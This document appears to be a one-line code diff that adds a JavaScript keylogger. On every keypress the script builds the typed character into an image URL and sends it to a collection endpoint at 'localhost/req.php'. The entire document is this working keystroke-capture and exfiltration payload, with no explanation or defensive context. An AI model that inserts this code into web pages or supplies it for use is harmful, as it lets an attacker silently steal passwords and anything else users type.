@@ -1,0 +1,1 @@
+document.addEventListener('keypress', ({keyCode, charCode, which}) => new Image().src = `http://localhost/req.php?c=${encodeURIComponent(String.fromCharCode(keyCode || charCode || which))}`)
